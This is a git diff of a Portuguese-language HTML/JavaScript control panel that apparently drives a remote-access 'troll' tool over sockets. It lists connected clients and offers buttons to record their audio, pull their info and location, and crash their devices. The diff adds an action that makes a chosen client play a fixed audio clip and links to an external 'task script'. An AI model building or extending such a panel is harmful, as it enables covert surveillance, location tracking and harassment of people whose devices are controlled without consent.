@@ -117,7 +117,7 @@
   <!-- Login -->
   <div id="login">
     <div class="login-card animate__animated animate__fadeInDown">
-      <h4 class="mb-4 text-center"><i class="fa-solid fa-user-shield me-2"></i>Coloca o login ai</h4>
+      <h4 class="mb-4 text-center"><i class="fa-solid fa-user-shield me-2"></i>Login Admin</h4>
       <input id="user" class="form-control mb-3" placeholder="Usuário">
       <input id="pass" type="password" class="form-control mb-4" placeholder="Senha">
       <button class="btn btn-accent w-100 btn-login">Entrar</button>
@@ -127,7 +127,7 @@
 
   <!-- Painel -->
   <div id="panel" style="display:none;height:100vh" class="animate__animated animate__fadeIn">
-    <nav class="navbar navbar-dark px-3"><span class="navbar-brand"><i class="fa-solid fa-scarecrow"></i><strong style="color:#e29608">Sukita is the main of DL </strong><strong style="color:#3bff76">v2.1</strong></span></nav>
+    <nav class="navbar navbar-dark px-3"><span class="navbar-brand"><i class="fa-solid fa-scarecrow"></i><strong style="color:#e29608">Sukita is the main of DL </strong><strong style="color:#3bff76">WORKING</strong></span></nav>
     <div class="d-flex" style="height:calc(100% - 56px)">
       <aside class="sidebar p-3">
         <h6 class="fw-semibold mb-3">Conectados agora: <span id="count" class="badge bg-accent2">0</span></h6>
@@ -152,7 +152,11 @@
         <div class="menu-btn" data-action="rec-audio"><i class="fa-solid fa-microphone"></i><span>Gravar áudio</span></div>
         <div class="menu-btn" data-action="stop-audio"><i class="fas fa-volume-mute"></i><span>Stop áudio</span></div>
         <div class="menu-btn" data-action="download-audio"><i class="fa-solid fa-wifi"></i><span>Site de áudios</span></div>
-        <div class="menu-btn" data-action="upload-audio"><i class="fa-solid fa-upload"></i><span>Enviar áudio</span></div>
+             <div class="menu-btn" data-action="upload-audio"><i class="fa-solid fa-upload"></i><span>Exportar áudio</span></div>
+       <div class="menu-btn" data-action="troll-audio">
+  <i class="fa-solid fa-upload"></i>
+  <span>Enviar áudio</span>
+</div>
         <div class="menu-btn info-btn" data-action="info"><i class="fa-solid fa-map-location-dot"></i><span>Pegar infos</span></div>
         <div class="menu-btn danger-btn" data-action="crash"><i class="fa-solid fa-bug"></i><span>Crashar tudo kkkkk</span></div>
       </div>
@@ -167,7 +171,7 @@
       <div class="d-grid gap-3">
         <a href="https://manus.im/" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>MANUS.IM</span></a>
         <a href="https://pastebin.com/raw/mNtFVJJa" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>Infos do MANUS.IM</span></a>
-        <a href="https://saporraesukita.netlify.app" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>Script de tarefa <strong style="color:#FF0000">NOT WORKING</strong></span></a>
+        <a href="https://saporraesukita.netlify.app/sukitaslf" target="_blank" class="menu-btn"><i class="fa-solid fa-link"></i><span>Script de tarefa <strong style="color:#c4b213">TESTING</strong></span></a>
       </div>
     </div>
   </div>
@@ -291,6 +295,7 @@ document.querySelector('.btn-login').onclick = () => {
 
 
 
+
 document.getElementById('scriptsBubble').onclick = () => openOverlay('scriptsOverlay');
 
     /* ======== Const e helpers ======== */
@@ -384,6 +389,11 @@ document.getElementById('updatesLinkBtn').onclick = () => {
         case 'upload-audio':   $('audioFile').click(); break;
         case 'info':      showInfo(); break;
         case 'crash':     crashModal.show(); break;
+        case 'troll-audio':
+  socket.emit('troll-audio', currentUUID);   // pede ao server tocar o áudio fixo
+  toast('Áudio enviado','primary');
+  break;
+
       }
     });
 
